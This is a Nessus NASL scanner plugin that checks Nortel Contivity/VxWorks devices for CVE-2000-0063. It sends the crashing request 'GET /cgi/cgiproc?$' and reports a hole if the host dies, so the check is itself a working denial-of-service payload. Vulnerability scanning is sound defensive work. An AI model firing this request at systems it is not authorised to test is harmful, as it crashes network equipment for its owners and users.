#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10160);
 script_bugtraq_id(938);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2000-0063");
 name["english"] = "Nortel Contivity DoS";
 name["francais"] = "Nortel Contivity DoS";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It is possible to crash the remote host by doing the HTTP
request :
	 GET /cgi/cgiproc?$

Solution : upgrade to VxWorks 2.60
Risk factor : High
Bugtraq ID : 938";


 desc["francais"] = "
Il est possible de tuer le système distant en
faisant la requète :
	GET /cgi/cgiproc?$


Solution : mettez à jour VxWorks en version  2.60
Facteur de risque : Sérieux
ID Bugtraq : 938";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "crashes the remote host";
 summary["francais"] = "Tue le système distant";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

 port = get_http_port(default:80);

 if(http_is_dead(port:port))exit(0);
 is_cgi_installed_ka(item:"/cgi/cgiproc?$", port:port);
 sleep(5); 
 if(http_is_dead(port:port))
 {
	security_hole(port);
	set_kb_item(name:"Host/dead",value:TRUE);
 } 
